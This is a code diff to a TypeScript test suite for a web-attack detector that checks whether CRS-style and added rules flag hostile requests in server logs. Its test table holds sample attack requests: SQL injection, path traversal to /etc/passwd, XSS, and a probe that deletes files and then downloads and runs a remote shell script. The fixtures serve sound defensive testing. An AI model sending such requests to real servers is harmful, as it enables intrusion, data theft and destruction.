@@ -3,7 +3,7 @@ import type { EventBus } from '../event-bus.js';
 import type { ThreatEvent } from '../../types/events.js';
 import { configureAttackDetection } from '../../core/log-parser.js';
 import { crsAttackType } from '../../core/crs/engine.js';
-import { CRS_RULES } from '../../core/crs/rules.generated.js';
+import { CRS_RULES, THREATCRUSH_RULES } from '../../core/crs/rules.generated.js';
 import { DEFAULT_RULES } from '../rules/default-rules.js';
 import { RuleEngine } from '../rules/engine.js';
 
@@ -51,6 +51,7 @@ describe('web-attack rules on daemon log-watcher events', () => {
   it.each([
     ['web-sqli-attack', 'GET /search?q=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1', undefined],
     ['web-path-traversal', 'GET /download?file=../../../../etc/passwd HTTP/1.1', undefined],
+    ['web-path-traversal', 'GET /etc/passwd HTTP/1.1', undefined],
     ['web-xss-attack', 'GET /?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1', undefined],
     ['web-scanner-user-agent', 'GET / HTTP/1.1', SQLMAP_UA],
     ['exploit-probe-pattern', 'GET /shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.7/x.sh;sh+x.sh HTTP/1.1', undefined],
@@ -76,9 +77,9 @@ describe('web-attack rules on daemon log-watcher events', () => {
   });
 
   // Default-off rules included: `include_rules` can switch them back on.
-  const emittable = [...new Set(CRS_RULES.map((rule) => crsAttackType(rule)))];
+  const emittable = [...new Set([...CRS_RULES, ...THREATCRUSH_RULES].map((rule) => crsAttackType(rule)))];
 
-  it('credits every ban-level request to a type: no ported CRS rule is untyped', () => {
+  it('credits every ban-level request to a type: no loaded rule is untyped', () => {
     expect(emittable).not.toContain(null);
   });
 
